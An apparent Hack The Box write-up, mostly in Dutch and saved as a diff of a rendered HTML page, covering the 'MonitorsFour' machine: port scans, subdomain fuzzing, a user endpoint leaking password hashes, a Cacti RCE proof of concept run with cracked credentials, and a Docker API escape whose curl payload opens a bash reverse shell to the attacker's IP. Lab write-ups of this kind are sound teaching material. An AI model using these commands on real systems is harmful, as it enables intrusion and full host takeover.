@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/MonitorsFour] └─$ nmap 10.129.7.126 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 13:44 CET Nmap scan report for 10.129.7.126 Host is up (0.019s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-monitorsfour/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/MonitorsFour] └─$ nmap 10.129.7.126 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 13:44 CET Nmap scan report for 10.129.7.126 Host is up (0.019s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.">
+  <meta itemprop="wordCount" content="762">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/MonitorsFour] └─$ nmap 10.129.7.126 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 13:44 CET Nmap scan report for 10.129.7.126 Host is up (0.019s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 5985/tcp open wsman Detailed port scan At the detailed port scan go to get more information from the host.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-monitorsfour/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/MonitorsFour]
+└─$ nmap 10.129.7.126                                                
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 13:44 CET
+Nmap scan report for 10.129.7.126
+Host is up (0.019s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+5985/tcp open  wsman
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the host.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/MonitorsFour]
+└─$ nmap -p 80,5985 -sCV 10.129.7.126
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 13:45 CET
+Nmap scan report for 10.129.7.126
+Host is up (0.017s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx
+|_http-title: Did not follow redirect to http://monitorsfour.htb/
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre><p>Zoals altijd de FQDN gaan toevoegen aan de hosts file. Nu ben ik naar de webpagina gaan kijken en daar kan je niet veel interessante information vinden. Ik ben dus gaan zoeken of dat je geen subdomain hebt en dit door gebruik te maken van het onderstaande commando kan je zien dat er een subdomain <code>cacti</code> is.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/MonitorsFour]
+└─$ ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -H &#34;HOST:FUZZ.monitorsfour.htb&#34; -ac
+
+cacti                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 23ms]
+:: Progress: [29999/29999] :: Job [1/1] :: 1379 req/sec :: Duration: [0:00:18] :: Errors: 1 ::
+</code></pre><p>Nu zal ik deze gaan toevoegen aan de hosts file en een keer gaan kijken naar de webpagina. Daar kan je zien dat de webserver op versie 1.2.28 draait.</p>
+<p>![[Pasted image 20251208121852.png]]</p>
+<p>Binnen het ffuf commando kan je zien dat er een user dir bestaat. maar hierbij krijg ik de volgende error te zien.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/MonitorsFour/CVE-2025-24367-Cacti-PoC]
+└─$ ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  -ac                               
+contact                 [Status: 200, Size: 367, Words: 34, Lines: 5, Duration: 51ms]
+login                   [Status: 200, Size: 4340, Words: 1342, Lines: 96, Duration: 66ms]
+user                    [Status: 200, Size: 35, Words: 3, Lines: 1, Duration: 44ms]
+static                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 22ms]
+views                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 26ms]
+controllers             [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 22ms]
+forgot-password         [Status: 200, Size: 3099, Words: 164, Lines: 84, Duration: 44ms]
+</code></pre><p>![[Pasted image 20251208133150.png]]</p>
+<p>Zoals je hieronder kunt zien hebben we het password hash van 4 users. Ik zal deze gaan decrypten door gebruik te maken van crackstation.</p>
+<pre tabindex="0"><code>http://monitorsfour.htb/user?id=2&amp;token=0
+
+[{&#34;id&#34;:2,&#34;username&#34;:&#34;admin&#34;,&#34;email&#34;:&#34;admin@monitorsfour.htb&#34;,&#34;password&#34;:&#34;56b32eb43e6f15395f6c46c1c9e1cd36&#34;,&#34;role&#34;:&#34;super user&#34;,&#34;token&#34;:&#34;8024b78f83f102da4f&#34;,&#34;name&#34;:&#34;Marcus Higgins&#34;,&#34;position&#34;:&#34;System Administrator&#34;,&#34;dob&#34;:&#34;1978-04-26&#34;,&#34;start_date&#34;:&#34;2021-01-12&#34;,&#34;salary&#34;:&#34;320800.00&#34;},{&#34;id&#34;:5,&#34;username&#34;:&#34;mwatson&#34;,&#34;email&#34;:&#34;mwatson@monitorsfour.htb&#34;,&#34;password&#34;:&#34;69196959c16b26ef00b77d82cf6eb169&#34;,&#34;role&#34;:&#34;user&#34;,&#34;token&#34;:&#34;0e543210987654321&#34;,&#34;name&#34;:&#34;Michael Watson&#34;,&#34;position&#34;:&#34;Website Administrator&#34;,&#34;dob&#34;:&#34;1985-02-15&#34;,&#34;start_date&#34;:&#34;2021-05-11&#34;,&#34;salary&#34;:&#34;75000.00&#34;},{&#34;id&#34;:6,&#34;username&#34;:&#34;janderson&#34;,&#34;email&#34;:&#34;janderson@monitorsfour.htb&#34;,&#34;password&#34;:&#34;2a22dcf99190c322d974c8df5ba3256b&#34;,&#34;role&#34;:&#34;user&#34;,&#34;token&#34;:&#34;0e999999999999999&#34;,&#34;name&#34;:&#34;Jennifer Anderson&#34;,&#34;position&#34;:&#34;Network Engineer&#34;,&#34;dob&#34;:&#34;1990-07-16&#34;,&#34;start_date&#34;:&#34;2021-06-20&#34;,&#34;salary&#34;:&#34;68000.00&#34;},{&#34;id&#34;:7,&#34;username&#34;:&#34;dthompson&#34;,&#34;email&#34;:&#34;dthompson@monitorsfour.htb&#34;,&#34;password&#34;:&#34;8d4a7e7fd08555133e056d9aacb1e519&#34;,&#34;role&#34;:&#34;user&#34;,&#34;token&#34;:&#34;0e111111111111111&#34;,&#34;name&#34;:&#34;David Thompson&#34;,&#34;position&#34;:&#34;Database Manager&#34;,&#34;dob&#34;:&#34;1982-11-23&#34;,&#34;start_date&#34;:&#34;2022-09-15&#34;,&#34;salary&#34;:&#34;83000.00&#34;}]
+</code></pre><p>Zoals je zult kunnen zien wordt alleen het password van de Administrator <code>Marcus</code> gevonden. De rest is not found.</p>
+<p>![[Pasted image 20251208134333.png]]</p>
+<p>Nu zal ik de user marcus en zijn password <code>wonderful1</code> kunnen gebruiken voor de onderstaande RCE exploit uittevoeren. De exploit die ik zal gebruiken voor de cacti v1.2.28 is het onderstaande CVE.
+<a href="https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC">https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC</a>
+RCE command</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/MonitorsFour/CVE-2025-24367-Cacti-PoC]
+└─$ python3 exploit.py \
+  -u marcus \
+  -p wonderful1 \
+  -i 10.10.16.154 \
+  -l 4444 \
+  -url http://cacti.monitorsfour.htb 
+[+] Cacti Instance Found!
+[+] Serving HTTP on port 80
+[+] Login Successful!
+[+] Got graph ID: 226
+[i] Created PHP filename: Itoxb.php
+[+] Got payload: /bash
+[i] Created PHP filename: nVnKs.php
+[+] Hit timeout, looks good for shell, check your listener!
+[+] Stopped HTTP server on port 80
+</code></pre><p>Listener</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.7.126 61468
+bash: cannot set terminal process group (7): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@821fbd6a43fa:~/html/cacti$ 
+</code></pre><p>Zoals je nu kunt zien zijn we ingelogged op de webserver als user www-data. Met deze user kan je gewoon de user flag binnen de marcus user zijn home dir vinden.</p>
+<p>User flag: 5bd503e0d3eb2610927a95bf63f2ab16</p>
+<pre tabindex="0"><code>www-data@821fbd6a43fa:/usr/bin$ cat /home/marcus/user.txt
+cat /home/marcus/user.txt
+5bd503e0d3eb2610927a95bf63f2ab16
+</code></pre><p>Zoeken naar wrm ik ssrf moet gebruiken.
+uname -a</p>
+<pre tabindex="0"><code>www-data@821fbd6a43fa:~/html/cacti$ uname -a
+uname -a
+Linux 821fbd6a43fa 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 GNU/Linux
+</code></pre><p>docker info
+docker info | grep &ldquo;Server Version&rdquo;
+hostname</p>
+<p>Voor de root te worden ben ik gaan zoeken naar een SSRF exploit. Hierbij heb ik de volgende exploit gevonden. <a href="https://blog.qwertysecurity.com/Articles/blog3">https://blog.qwertysecurity.com/Articles/blog3</a></p>
+<pre tabindex="0"><code>www-data@821fbd6a43fa:/tmp$ curl -X POST \
+  -H &#34;Content-Type: application/json&#34; \
+  -d &#39;{
+    &#34;Image&#34;:&#34;docker_setup-nginx-php:latest&#34;,
+    &#34;Cmd&#34;:[&#34;bash&#34;,&#34;-c&#34;,&#34;bash -i &gt;&amp; /dev/tcp/10.10.16.154/444 0&gt;&amp;1&#34;],
+    &#34;HostConfig&#34;:{
+      &#34;Binds&#34;:[&#34;/mnt/host/c:/host_root&#34;]
+    }
+  }&#39; \
+  -o create.json \
+  http://192.168.65.7:2375/containers/create
+</code></pre><pre tabindex="0"><code>www-data@821fbd6a43fa:/tmp$ cid=$(cut -d&#39;&#34;&#39; -f4 create.json)
+</code></pre><pre tabindex="0"><code>curl -X POST \
+  -d &#39;&#39; \
+  http://192.168.65.7:2375/containers/$cid/start
+  
+Listener
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 444 
+Listening on 0.0.0.0 444
+Connection received on 10.129.7.126 61477
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@e89e36b004d7:/var/www/html# 
+</code></pre><p>Root flag: 6e5055c1a90fae11ade06fc52b061d4a</p>
+<pre tabindex="0"><code>root@e89e36b004d7:/host_root/Users/Administrator/Desktop# cat roo
+cat root.txt 
+6e5055c1a90fae11ade06fc52b061d4a
+</code></pre><p>![[Pasted image 20251208184318.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
